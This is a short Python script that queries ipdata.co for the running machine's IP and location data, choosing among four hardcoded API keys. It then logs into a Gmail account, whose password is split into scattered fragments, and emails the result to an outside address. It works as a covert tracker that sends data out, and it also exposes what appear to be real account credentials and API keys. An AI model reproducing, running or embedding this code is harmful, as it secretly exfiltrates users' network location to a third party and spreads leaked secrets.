import smtplib, requests, random
user = 'ipdata.server@gmail.com'
pwd12 = 'Gs'
pwd32 = 'g7'
pwd37 = '2D'
pwd44 = 'w%'
pwd05 = 'w7'
pwd68 = 'Ve'
pwd17 = 'i8'
pwd86 = 'f'
pwd = pwd12+pwd32+pwd37+pwd44+pwd05+pwd68+pwd17+pwd86
ipdata_list = ['https://api.ipdata.co/?api-key=6818a70bf0dcdbf1dd6bf89e62299740a49725ac65ff8e4056e3b343', 'https://api.ipdata.co/?api-key=7d9bf69a54c63b6f9274c6074b2f50aee46208d10a33533452add840', 'https://api.ipdata.co/?api-key=6453632fcabd2a4c2de4bb45ab35254594fd719e61d58bacde4429f0', 'https://api.ipdata.co/?api-key=6aed0320c458287bdc453ce543c6edc565fd098eda4a79f7e41b3b61']
ipdata = random.choice(ipdata_list)
body = requests.get(ipdata).text
server = smtplib.SMTP("smtp.gmail.com", 587)
server.starttls()
server.login(user, pwd)
server.sendmail(user, "miguardzecurity@gmail.com", body)
